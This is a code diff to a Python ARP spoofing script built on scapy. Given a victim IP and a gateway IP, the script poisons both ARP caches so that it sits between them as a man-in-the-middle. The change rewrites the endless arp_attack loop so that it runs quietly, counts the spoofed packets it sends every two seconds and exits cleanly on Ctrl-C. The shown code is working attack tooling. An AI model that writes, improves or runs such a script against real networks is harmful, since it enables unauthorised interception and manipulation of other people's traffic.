@@ -34,11 +34,16 @@ def packet_spoof(sent_to_ip,spoof_ip,spoof_mac):
 	return packet
 
 def arp_attack(packet1,packet2):
-	while True:
-		scapy.send(packet1)
-		scapy.send(packet2)
-		time.sleep(2)
-		
+	count = 0
+	try:
+		while True:
+			scapy.send(packet1,verbose=False)
+			scapy.send(packet2,verbose=False)
+			count+=2
+			print('\r[+] Sent packets: {}'.format(count),end='')
+			time.sleep(2)
+	except KeyboardInterrupt:
+		print('\n[+] Detected CTRL C...quitting!')
 args = get_args()
 victim_ip = args.victim_ip
 gateway_ip = args.gateway_ip
